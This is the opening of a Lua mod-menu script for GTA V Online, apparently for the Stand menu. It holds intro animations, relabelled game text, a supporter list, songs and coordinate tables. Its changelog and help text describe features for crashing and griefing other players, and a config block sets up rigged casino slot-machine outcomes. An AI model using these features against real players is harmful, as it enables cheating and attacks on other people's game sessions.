--[[
 _________     _________    ________     ________     ________     _________     _________    ________     ________     ________      _________     _________    ________     ________     ________ 
|\   ____ \   |\___  ___\  |\   __  \   |\   __  \   |\   __  \   |\   ____ \   |\___  ___\  |\   __  \   |\   __  \   |\   __  \    |\   ____ \   |\___  ___\  |\   __  \   |\   __  \   |\   __  \
\ \  \___| \  \|___\  \_/  \ \  \|\ /_  \ \  \|\ /_  \ \  \|\ /_  \ \  \___| \  \|___\  \_/  \ \  \|\ /_  \ \  \|\ /_  \ \  \|\ /_   \ \  \___| \  \|___\  \_/  \ \  \|\ /_  \ \  \|\ /_  \ \  \|\ /_
 \ \  \ __  \     \ \  \    \ \   __  \  \ \   __  \  \ \   __  \  \ \  \ __  \     \ \  \    \ \   __  \  \ \   __  \  \ \   __  \   \ \  \ __  \     \ \  \    \ \   __  \  \ \   __  \  \ \   __  \ 
  \ \  \|\ \ \     \ \  \    \ \  \|\  \  \ \  \|\  \  \ \  \|\  \  \ \  \|\ \ \     \ \  \    \ \  \|\  \  \ \  \|\  \  \ \  \|\  \   \ \  \|\ \ \     \ \  \    \ \  \|\  \  \ \  \|\  \  \ \  \|\  \
   \ \________\     \ \__\    \ \_______\  \ \_______\  \ \_______\  \ \________\     \ \__\    \ \_______\  \ \_______\  \ \_______\   \ \________\     \ \__\    \ \_______\  \ \_______\  \ \_______\
    \|________|      \|__|     \|_______|   \|_______|   \|_______|   \|________|      \|__|     \|_______|   \|_______|   \|_______|    \|________|      \|__|     \|_______|   \|_______|   \|_______|
                                                                                                                                                                                                                                    
 _________  ________  ________  ________   ________  ___       ________  _________  _______   ________          ________ ________  ________  _____ ______              _________      _________ 
|\___   ___\\   __  \|\   __  \|\   ___  \|\   ____\|\  \     |\   __  \|\___   ___\\  ___ \ |\   ___ \        |\  _____\\   __  \|\   __  \|\   _ \  _   \           |\    _____\   |\___  ___\  
\|___ \  \_\ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|\ \  \    \ \  \|\  \|___ \  \_\ \   __/|\ \  \_|\ \       \ \  \__/\ \  \|\  \ \  \|\  \ \  \\\__\ \  \           \ \  \___| \  \|___\  \_/  
     \ \  \ \ \   _  _\ \   __  \ \  \\ \  \ \_____  \ \  \    \ \   __  \   \ \  \ \ \  \_|/_\ \  \ \\ \       \ \   __\\ \   _  _\ \  \\\  \ \  \\|__| \  \           \ \  \ __  \     \ \  \    
      \ \  \ \ \  \\  \\ \  \ \  \ \  \\ \  \|____|\  \ \  \____\ \  \ \  \   \ \  \ \ \  \_|\ \ \  \_\\ \       \ \  \_| \ \  \\  \\ \  \\\  \ \  \    \ \  \           \ \  \|\ \ \     \ \  \    
       \ \__\ \ \__\\ _\\ \__\ \__\ \__\\ \__\____\_\  \ \_______\ \__\ \__\   \ \__\ \ \_______\ \_______\       \ \__\   \ \__\\ _\\ \_______\ \__\    \ \__\           \ \________\     \ \__\    
        \|__|  \|__|\|__|\|__|\|__|\|__| \|__|\_________\|_______|\|__|\|__|    \|__|  \|_______|\|_______|        \|__|    \|__|\|__|\|_______|\|__|     \|__|            \|________|      \|__|  
--]]
require "lib.GTSCRIPTS.W"
require "lib.GTSCRIPTS.O" 
require "lib.GTSCRIPTS.T"
scaleform = require('lib.GTSCRIPTS.Z')
sf = scaleform('instructional_buttons')
translations = {}
Lang = {}
Lang.Version = ""
Template = false
translations.lang = {}
translations.current_translations = {}
translations.missing_translations = {}
friends_in_this_session = {}
modders_in_this_session = {}
wait = util.yield
gtoast = util.toast
GTluaScript = menu
GT = GTluaScript.list
GTAC = GTluaScript.action
GTD = GTluaScript.divider
GTLP = GTluaScript.toggle_loop
GTTG = GTluaScript.toggle
GTH = GTluaScript.hyperlink
new = {}
Ini = {}
GT_version = '6.28'
translations = {}
setmetatable(translations, {
    __index = function (self, key)
        return key
    end
})
function updatelogs()
    notification("GTLuaVIP现在支持自动记录作弊者\n信息保存位置在GTLuaScript>Players\n精确到保存时间，以及所有的信息\n让你不放过你的每一个对手\n更新>玩家选项>战局玩家\n新增>友好选项>检测状态\n新增>自我选项>增强选项>战局切换\n新增>自我选项>增强选项>自动切换无人战局\n新增>恶搞选项>近期更新>附近车辆撞击\n新增>恶搞选项>近期更新>强制下地狱\n新增>恶搞选项>近期更新>观音坐莲\n新增>恶搞选项>近期更新>持续扫射攻击\n新增>恶搞选项>近期更新>附加附近所有实体\n添加了新的皇榜名单\n我们稍稍适配了天眼黑客面板功能，这会让它按预期正常运行\n目前仍然在等待Heist Control的新版本，当更新后我们会第一时间适配\n其他的一些改进与修复")
end
loading_frames = {'', 'G', 'GR', 'GRA', 'GRAN', 'GRAND', 'GRANDT', 'GRANDTO', 'GRANDTOU', 'GRANDTOUR', 'GRANDTOURI', 'GRANDTOURIN', 'GRANDTOURING', 'GRANDTOURINGV', 'GRANDTOURINGVI', 'GRANDTOURINGVIP', 'GRANDTOURINGVIP', 'GRANDTOURING', 'GRAND', '', 'GRANDTOURINGVIP', '', 'GRANDTOURINGVIP', '', 'GRANDTOURINGVIP', '', 'GRANDTOURINGVIP', 'GRANDTOURINGVIP', 'GRANDTOURINGVIP'}
coasttext = "#点击后将自动开启悬浮模式传送至空中并且进行崩溃.\n#数秒后,您将自动被传送至机场,并且自动关闭悬浮模式.\n\n注:为了您的安全,不要试图观看对方"
bbtxt = "https://jq.qq.com/?_wv=1027&k=U3XOlyOF"
bbtct = "[点击此处加入官方群聊中进行询问]\n\n*加载脚本显示(请稍等...):#网络问题\n#建议更换您的节点/模式或加速器\n\n*加载脚本提示缺少(not found)文件,\n 或加载脚本提示缺少(no file)文件: #请重新安装脚本及脚本依赖文件\n#建议使用<丢丢原装lua>覆盖lua文件\n其他疑问与发现请联系开发人员,非常感谢您的支持儿,祝您游戏愉快儿~"
Name_info = WIRI_SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
gtoast("欢迎使用GRANDTOURINGVIP!\n \n当前版本 " .. GT_version .. " 欢迎 ".. Name_info .."\n" .. "\n" .. "进群获取最新版本...\n" .. "\n" .. "祝您游戏愉快儿 :)")
util.show_corner_help("~b~~h~GRANDTOURINGVIP " .. GT_version .. "  ~q~ \n~r~我们的脚本完全免费\n~q~转到>其他选项 加入群聊\n~y~免费获得最新版本")
--[[if SCRIPT_MANUAL_START then
scaleform_thread = util.create_thread(function (thr)
scaleForm = GRAPHICS.REQUEST_SCALEFORM_MOVIE("POPUP_WARNING")
GRAPHICS.DRAW_RECT(-1, .5, 1, -1, 255, 158, 177, 255)
GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleForm, "SHOW_POPUP_WARNING")
GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleForm, 0, 0, 0, 0, 0)
GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(500.0)
GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("~h~~r~~n~∑~y~G~g~T~q~L~p~U~f~A~p~S~g~C~b~R~q~I~p~P~k~T~g~S~p~~r~∑")
GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("~h~~r~∑~y~G~g~R~q~A~p~N~f~D~p~T~g~O~b~U~q~R~p~I~k~N~g~G~p~V~y~I~g~P~r~∑~r~~n~¦~h~~g~[".. PLAYER.GET_PLAYER_NAME(players.user()).. "]~y~VIP∑\n~h~~f~Version : " .. GT_version .. "")
GRAPHICS.END_SCALEFORM_MOVIE_METHOD(scaleForm)
starttime = os.time()
while true do
if os.time() - starttime >= 3 then
util.stop_thread()
end
if GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleForm) then
GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleForm, 255, 255, 255, 255, 0)
end
wait(0)
end
end)
end]]
--
function toFloat(num)
return (num / 10) * 10
end
--
function SETUP_SINGLE_LINE(scaleform)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SETUP_SINGLE_LINE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(70.0)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(125.0)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("left")
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function ADD_TEXT_TO_SINGLE_LINE(scaleform, text, font, colour)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "ADD_TEXT_TO_SINGLE_LINE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(text)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(font)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(colour)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(true)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
cTime = util.current_time_millis
if SCRIPT_MANUAL_START then
    gShowingIntro = true
    local state = 0
    local sTime = util.current_time_millis()
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "clown_die_wrapper", PLAYER.PLAYER_PED_ID(), "BARRY_02_SOUNDSET", true, 20)
    scripts_dir = filesystem.scripts_dir() .. '\\GTLuaScript\\'
    util.create_tick_handler(function()	
    local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("OPENING_CREDITS")	
    while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) do
    wait()
    end
    HUD.HIDE_HUD_AND_RADAR_THIS_FRAME()
    if state == 0 then
    SETUP_SINGLE_LINE(scaleform)
    ADD_TEXT_TO_SINGLE_LINE(scaleform, "Welcome", "$font5", "HUD_COLOUR_FREEMODE")
    ADD_TEXT_TO_SINGLE_LINE(scaleform, PLAYER.GET_PLAYER_NAME(players.user()), "$font5", "HUD_COLOUR_PINK")
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_SINGLE_LINE")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_CREDIT_BLOCK")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Pre_Screen_Stinger", PLAYER.PLAYER_PED_ID(), "DLC_HEISTS_FINALE_SCREEN_SOUNDS", true, 20)
    state = 1
    sTime = util.current_time_millis()
    end
    if util.current_time_millis() - sTime >= 4000 and state == 1 then
    HIDE(scaleform)
    state = 2
    sTime = util.current_time_millis()
    end
    if util.current_time_millis() - sTime >= 3000 and state == 2 then
    SETUP_SINGLE_LINE(scaleform)
    ADD_TEXT_TO_SINGLE_LINE(scaleform, "GRANDTOURINGVIP", "$font5", "HUD_COLOUR_FREEMODE")
    ADD_TEXT_TO_SINGLE_LINE(scaleform, 'v' .. Version, "$font5", "HUD_COLOUR_RED")
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_SINGLE_LINE")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_CREDIT_BLOCK")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "SPAWN", PLAYER.PLAYER_PED_ID(), "BARRY_01_SOUNDSET", true, 20)
    state = 3
    sTime = util.current_time_millis()
    end
    if util.current_time_millis() - sTime >= 4000 and state == 3 then
    HIDE(scaleform)
    state = 4
    sTime = util.current_time_millis()
    end
    if util.current_time_millis() - sTime >= 3000 and state == 4 then
    gShowingIntro = false
    return false
    end     
    GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleform, 255, 255, 255, 255, 0)
    return true
    end)
end

--[[if SCRIPT_MANUAL_START then   
scaleform_thread = util.create_thread(function (thr)
launch_guided_missile_scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("SUBMARINE_MISSILES")
GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(launch_guided_missile_scaleform, "GENERIC_2")
GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(launch_guided_missile_scaleform, 255, 255, 255, 255, 0)
GRAPHICS.END_SCALEFORM_MOVIE_METHOD(launch_guided_missile_scaleform)
launch_guided_missile_scaleform_2 = GRAPHICS.REQUEST_SCALEFORM_MOVIE("DRONE_CAM")
GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(launch_guided_missile_scaleform_2, "DRONE_CAM")
GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(launch_guided_missile_scaleform_2, 255, 255, 255, 255, 0)
GRAPHICS.END_SCALEFORM_MOVIE_METHOD(launch_guided_missile_scaleform_2)
starttime = os.time()
while true do
if os.time() - starttime >= 5 then
util.stop_thread()
end
if GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(launch_guided_missile_scaleform) then
GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(launch_guided_missile_scaleform, 255, 255, 255, 255, 0)
end
wait(1)
end
end)
end
--]]

function do_label_preset(label, text)
    log("Setting up label present for label " .. label .. " with text " .. text)
    menu.trigger_commands("addlabel " .. label)
    local prep = "edit" .. string.gsub(label, "_", "") .. " " .. text
    menu.trigger_commands(prep)
    end
    function GTNB()
    do_label_preset("HUD_JOINING", "正在使用GTMENU加入在线模式")
    do_label_preset("MP_SPINLOADING", "GTMENU YYDS")
    do_label_preset("HUD_LBD_FMP", "GRANDTOURING 在线模式（公开，~1~）")
    do_label_preset("HUD_LBD_FMI", "GRANDTOURING 在线模式（邀请，~1~）")
    do_label_preset("HUD_LBD_FMC", "GRANDTOURING 在线模式（帮会，~1~）")
    do_label_preset("HUD_LBD_FMF", "GRANDTOURING 在线模式（好友，~1~）")
    do_label_preset("HUD_LBD_FMS", "GRANDTOURING 在线模式（单人，~1~）")
    do_label_preset("0X56F3BD49", "GRANDTOURING 在线模式")
    do_label_preset("HUD_MAINTIT", "GRANDTOURINGVIP")
    do_label_preset("LOADING_SPLAYER_L", "正在加载GRANDTOURINGVIP故事模式")
    do_label_preset("PM_QUIT_MP", "离开 GRANDTOURING 在线模式")
    do_label_preset("PM_INF_LEAT", "离开 GRANDTOURING 在线模式")
    do_label_preset("PM_INF_LEAB", "立刻前往GRANDTOURING故事模式，您的所有游戏进度都将自动保存")
    do_label_preset("CMRC_STORE_OPEN", "GRANDTOURINGVIP 商店\n现已开放!")
    do_label_preset("UI_FLOW_OP_CL_M", "关于 GRANDTOURINGVIP")
    do_label_preset("UI_FLOW_OP_CL", "关于 GRANDTOURINGVIP")
    do_label_preset("UI_FLOW_OP_CL_d", "多亏了我们的GT开发团队\n您才能体验到无与伦比的GRANDTOURINGVIP\n主创作者:GT 副创开发:瑞思拜\n致谢人员:12 Super飞 柒月 小马哥 丢丢\n我们的群聊:238394690(脚本下载群) 716431566(日常聊天群)\n感谢您使用GRANDTOURINGVIP")
end

hb_id = {
    {name = "清欢"},
    {name = "12"},
    {name = "sjr"},
    {name = "柒月"},
    {name = "GAI"},
    {name = "庸人自扰"},
    {name = "某时某刻"},
    {name = "QIDMxc1111小马哥"},
    {name = "Super飞"},
    {name = "全副战神"},
    {name = "好雨知时节"},
    {name = "YYQQ"},
    {name = "西海"},
    {name = "点儿"},
    {name = "Anson⁶6⁶6⁶6⁶"},
    {name = "N"},
    {name = "Roll the coarse"},
    {name = "等天黑"},
    {name = "小维"},
    {name = "longsir666"},
    {name = "猛女丢丢"},
    {name = "cheng"},
    {name = "不困"},
    {name = "zssf"},
    {name = "南山先生"},
    {name = "狼烟4起"},
    {name = "汤姆"},
    {name = "禧冬"},
    {name = "西木"},
    {name = "C"},
    {name = "ikun"},
    {name = "Asuka02"},
    {name = "911每天都很想静静"},
    {name = "911丢丢是美少女战士"},
    {name = "苍柒"},
    {name = "caozei"},
    {name = "千总Gol"},
    {name = "张三"},
    {name = "福建吴彦祖"},
    {name = "他要打飞我"},
    {name = "moxz"},
    {name = "源"},
    {name = "浮生若梦"},
    {name = "网恋被骗一个肝"},
    {name = "青系"},
    {name = "M"},
    {name = "猪丶小三"},
    {name = "唯恐是梦"},
    {name = "Pluto"},
    {name = "小点点"},
    {name = "浅浅"},
    {name = "顾昔"},
    {name = "霜叶"},
    {name = "FlyingDog2333"},
    {name = "凇"},
    {name = "Martin_"},
    {name = "20"},
    {name = "小灰灰"},
    {name = "云梦"},
    {name = "YYYmaowazi"},
    {name = "烟"},
    {name = "Sy."},
    {name = "良笙"},
    {name = "苏梦钰"},
    {name = "霜雪洛月"},
    {name = "GG爆"},
    {name = "水墨画"},
    {name = "粉妆玉砌钱吉吉"},
    {name = "瑞瑞大佬"},
    {name = "晴天"},
    {name = "梁小帅"},
    {name = "GT作者们幸苦了"},
    {name = "约德尔肾亏小屁船儿"},
    {name = "绝夜凯撒"},
    {name = "XXSZAA"},
    {name = "闹心"},
    {name = "nightgame"},
    {name = "By白鸦"},
    {name = "2088371488"},
    {name = "刀锋冷"},
    {name = "醉酒狂歌"},
    {name = "og"},
    {name = "MoralitySpot"},
    {name = "Matt.隐隐蓝海"},
    {name = "暗"},
    {name = "帅比"},
    {name = "Mr.G"},
    {name = "时钟与汐城"},
    {name = "林雪洛"},
    {name = "等年"},
    {name = "小满"},
    {name = "萝莉控"},
    {name = "沸羊羊"},
    {name = "BING"},
    {name = "MuyuHuangh"},
    {name = "Sixwalnuts6"},
    {name = "ikun184"},
    {name = "槿篱"},
    {name = "钟子期"},
    {name = "若若"},
    {name = "LISA"},
    {name = "Faded"},
    {name = "眼眸"},
    {name = "测码豹"},
    {name = "谁为谁心疼"},
    {name = "Xp高端玩家"},
    {name = "随机且折磨"},
    {name = "周杰佗"},
    {name = "aswwd1"},
    {name = "深書"},
    {name = "淡写 、青春"},
    {name = "落"},
    {name = "古辉禾子"},
    {name = "小黑"},
    {name = "与鱼科技"},
    {name = "杨涵浩"},
    {name = "戴夫"},
    {name = "红旗车主半只烤鸭"},
    {name = "小姜"},
    {name = "南风"},
    {name = "小宇"},
    {name = "王维诗里的相思"},
    {name = "珞小柏"},
    {name = "double"},
    {name = "AK"},
    {name = "一叶知秋丶叶修"},
    {name = "古城kami"},
    {name = "小苏"},
    {name = "MOON"},
    {name = "祁梦"},
    {name = "伊卡洛斯"},
    {name = "洛城神委会"},
    {name = "猫小婕"},
    {name = "fantianpi"},
    {name = "初晴"},
    {name = "游戏旅行者"},
    {name = "啵啵的奶茶"},
    {name = "嗝阁革"},
    {name = "麦克"},
    {name = "街角"},
    {name = "guo666666"},
    {name = "AGL"},
    {name = "泰迪熊"},
    {name = "蓝海"},
    {name = "箫玖"},
    {name = "小竹"},
    {name = "大白"},
    {name = "年仔"},
    {name = "奶瓶"},
    {name = "山海"},
    {name = "校长爱打扑克"},
    {name = "白山茶"},
    {name = "阿米"},
    {name = "黑大帅"},
    {name = "TT"},
    {name = "唱跳Rap篮球丶"},
    {name = "秋词"},
    {name = "YIM用户"},
    {name = "沃德天.威森莫.拉莫帅"},
    {name = "戰超"},
    {name = "抑宇"},
    {name = "零壹大魔王"},
    {name = "安立"},
    {name = "年佑"},
    {name = "黑夜"},
    {name = "YUGG65"},
    {name = "MISS"},
    {name = "Mo_Bei_Sirius"},
    {name = "我是正义青年"},
    {name = "热浪"},
    {name = "嗜姬如雪"},
    {name = "龙天"},
    {name = "super-_-"},
    {name = "败北"},
    {name = "CX"},
    {name = "八月份的柿子"},
    {name = "老实人小王"},
    {name = "kuangye11"},
    {name = "老崔"},
    {name = "ln"},
    {name = "左岸"},
    {name = "爱"},
    {name = "清风"},
    {name = "炫彩"},
    {name = "YMYXYAYSH"},
    {name = "xXLrvdP_-"},
    {name = "bstwvb33"},
    {name = "典范大帅逼"},
    {name = "玖叁"},
    {name = "万斯"},
    {name = "大原批"},
    {name = "G-LIAN12"},
}

srgb = {cus = 100}
function requestweapon(...)
local arg = {...}
for _, model in ipairs(arg) do
WEAPON.REQUEST_WEAPON_ASSET(model, 31, 26)
while not WEAPON.HAS_WEAPON_ASSET_LOADED(model) do
wait()
end
end
end
function RGBNeonKit(pedm)
local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
for i = 0, 3 do
C_C_VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, true)
end
end
local rgb = {cus = 100}
function zjbs()
if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) ~= 0 then
local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
RGBNeonKit(players.user_ped())
local red = (math.random(0, 255))
local green = (math.random(0, 255))
local blue = (math.random(0, 255))
C_C_VEHICLE.SET_VEHICLE_NEON_COLOUR(vmod, red, green, blue)
C_C_VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vmod, red, green, blue)
C_C_VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vmod, red, green, blue)
wait(rgb.cus)
end
end
function qzd()
local color = {
{64, 1},
{73, 2},
{51, 3}, 
{92, 4}, 
{89, 5}, 
{88, 6}, 
{38, 7}, 
{39 , 8}, 
{137, 9}, 
{135, 10}, 
{145, 11},
{142, 12} 
}

if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ~= 0 then
local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
RGBNeonKit(players.user_ped())
local rcolor = math.random(1, 12)
C_C_VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
C_C_VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color[rcolor][1])
C_C_VEHICLE.SET_VEHICLE_COLOURS(vmod, color[rcolor][1], color[rcolor][1])
C_C_VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, 0, color[rcolor][1])
C_C_VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vmod, color[rcolor][1])
C_C_VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color[rcolor][2])
wait(srgb.cus)
end
end

colors = {
green = 184,
red = 6,
yellow = 190,
black = 2,
white = 1,
gray = 3,
pink = 201,
purple = 49, 
blue = 11
}

ladder_objects = {}
pause=0
do1=16
re=17
mi=18
fa=19
sol=20
la=21
ti=22
do2=23

C1 = 16
D1 = 17
E1 = 18
F1 = 19
G1 = 20
A1 = 21
B1 = 22
C2 = 23

whole = 1
half = 2
quarter = 4
eighth = 8
sixteenth = 16

MOD_HORN = 14

horn_on = false

songs = {
    {
        name = "一闪一闪亮晶晶",
        bpm = 90,
        notes = {
            pause,
            do1, do1, sol, sol, la, la, { pitch = sol, length = half }, pause,
            fa, fa, mi, mi, re, re, { pitch = do1, length = half }, pause,
            sol, sol, fa, fa, mi, mi, { pitch = re, length = half }, pause,
            sol, sol, fa, fa, mi, mi, { pitch = re, length = half }, pause,
            do1, do1, sol, sol, la, la, { pitch = sol, length = half }, pause,
            fa, fa, mi, mi, re, re, { pitch = do1, length = half }, pause,
        },
    },
    {
        name = "在月光下",
        bpm = 60,
        notes = {
            fa, fa, fa, sol, { pitch = la, length = half }, { pitch = sol, length = half },
            fa, la, sol, sol, { pitch = fa, length = whole },
            fa, fa, fa, sol,  { pitch = la, length = half }, { pitch = sol, length = half },
            fa, la, sol, sol, { pitch = fa, length = whole },
        },
    },
    {
        name = "热热的十字面包",
        bpm = 60,
        notes = {
            { pitch = mi, length = half }, { pitch = re, length = half },
            { pitch = do1, length = half }, { pitch = pause, length = half },
            { pitch = mi, length = half }, { pitch = re, length = half },
            { pitch = do1, length = half }, { pitch = pause, length = half },
            do1, do1, do1, do1, re, re, re, re,
            { pitch = mi, length = half }, { pitch = re, length = half },
            { pitch = do1, length = half }, { pitch = pause, length = half },
        },
    },
}
snowmens = {
    { -955.5352, -782.4186, 15.925326 },
    { -819.9067, 165.35524, 71.26295 },
    { -247.92003, -1561.2175, 32.22973 },
    { 901.3996, -288.05026, 65.643715 },
    { 1275.6772, -642.3789, 68.208786 },
    { 1993.1008, 3829.6396, 32.167336 },
    { -375.47916, 6230.158, 31.490055 },
    { -1414.4647, 5094.9272, 60.674263 },
    { -1946.0231, 594.93756, 119.79223 },
    { -1100.889, -1401.0138, 5.215467 },
    { -780.418, 877.2859, 203.18001 },
    { -455.12027, 1130.5625, 325.89175 },
    { 221.46722, -107.01075, 69.763985 },
    { 1560.3787, 6447.053, 23.9866 },
    { 3301.7886, 5149.8853, 18.34274 },
    { 1703.0568, 4671.928, 43.15301 },
    { 224.9161, 3107.3345, 42.18394 },
    { 2360.0037, 2522.7166, 46.66731 },
    { 1510.8555, 1725.0353, 109.89355 },
    { -48.96374, 1964.4028, 189.87181 },
    { -1516.2083, 2140.2168, 56.11924 },
    { -2826.2356, 1424.6211, 100.706116 },
    { -2957.531, 723.6389, 28.792404 },
    { 1341.4302, -1583.5093, 54.135414 },
    { 178.00232, -895.9712, 30.69326 }
}
config = {
    debug_mode = false,
    test_mode = false,
    delay_between_button_press = 500,
    delay_sitting_at_slot_machine = 5000,
    delay_between_spins = 3000,
    delay_after_entering_casino = 4000,
    default_spin_delay_time = 1000,
    max_daily_winnings = 45000000,
    millis_in_day = 86400000,
}
state = {}
menus = {}
commands = {
    rigslotmachines=menu.ref_by_path("Online>Quick Progress>Casino>Slot Machines Outcome")
}

slot_machine_positions = {
    {
        seated={x=1102.2573, y=232.43211, z=-50.0909},
        standing={x=1102.6787, y=232.73073, z=-49.84076, h=90},
    },
    {
        seated={x=1112.4808, y=234.83745, z=-50.0909},
        standing={x=1112.0146, y=235.13573, z=-49.84075, h=-90},
    },
    {
        seated={x=1110.1028, y=235.05864, z=-50.0909},
        standing={x=1110.5834, y=235.30466, z=-49.840767, h=90},
    },
    {
        seated={x=1111.9581, y=237.83565, z=-50.0909},
        standing={x=1112.1866, y=237.27339, z=-49.840763, h=0},
    },
    {
        seated={x=1113.66, y=238.81334, z=-50.0909},
        standing={x=1113.8134, y=238.09317, z=-49.840786, h=0}
    },
    {
        seated={x=1139.4238, y=250.89787, z=-51.2909},
        standing={x=1139.8647, y=250.2418, z=-51.035732, h=70}
    },
    {
        seated={x=1130.6184, y=251.2604, z=-51.2909},
        standing={x=1130.7328, y=251.68321, z=-51.035774, h=180}
    },
    {
        seated={x=1137.2375, y=253.092, z=-51.2909},
        standing={x=1137.3026, y=253.69514, z=-51.03577, h=180}
    },
    {
        seated={x=1103.4133, y=230.6071, z=-50.0909},
        standing={x=1102.95, y=230.27, z=-49.84, h=-90},
    },
    {
        seated={x=1118.7598, y=230.03072, z=-50.0909},
        standing={x=1119.2648, y=230.20291, z=-49.840748, h=100}
    },
}

 selectedobject = 1268884662
 all_objects = {
-1268884662,
-1268884662,
4121513285,
1085274000,
1729911864,
2166988379,
3702106121,
1398809829,
1043035044,
3639322914,
464329140,
4046278932,
3785611910,
388197031,
2977746558,
659187150,
420170064,
2436749075,
1193854962,
476379176,
630616933,
3945660640,
1565925668,
175309727,
3196461136,
3251728163,
176008245,
2112015640,
993120320,
865627822,
266130508,
3762892718,
3854180205,
2804199464,
523317885,
1327834842,
1321190118,
29828513,
-1026778664,
310817095,
4130089803,
148511758,
3087007557,
2969831089,
3533371316,
2024855755,
2450168807,
297107423,
2017086435,
3553022755,
4046278932,
3639322914,
3231494328,
3271283456,
386059801,
202070568,
1971657777,
2005313754,
3859048180,
866394777,
740404217,
2409855828,
286298615,
795984016,
2374537677,
3161612443,
1165195353,
2450522579,
4260070095,
974883178,
3965551402,
3854180205,
3696781377,
4124467285,
2684801972,
3449848423,
118627012,
1565925668,
1924419321,
2201918560,
3762892718,
266130508,
1193854962, 
630616933,
476379176,
2436749075,
2154892897,
1369811908,
2420804668,
1948561556,
356462018,
462203053,
3552768664,
2057223314,
3290378943,
168901740,
303280717,
725259233,
2064599526,
4204303756,
3185604174,
1046958884,
81317377,
2539784170,
795367207,
2684668286,
827574655,
617299305,
3999634798

} 

attachments_table = {
    ---------------------PISTOLS--------------------------------------
    ["0xFED0FD71"] = "Default Clip", --Default Clip
    ["0xED265A1C"] = "Extended Clip", --Extended Clip
    ["0x359B7AAE"] = "Flashlight", --Flashlight
    ["0x65EA7EBB"] = "Suppressor", --Suppressor
    ["0xD7391086"] = "Yusuf Amir Luxury Finish", --Yusuf Amir Luxury Finish
    ["0x721B079"] = "Default Clip", --Default Clip
    ["0xD67B4F2D"] = "Extended Clip", --Extended Clip
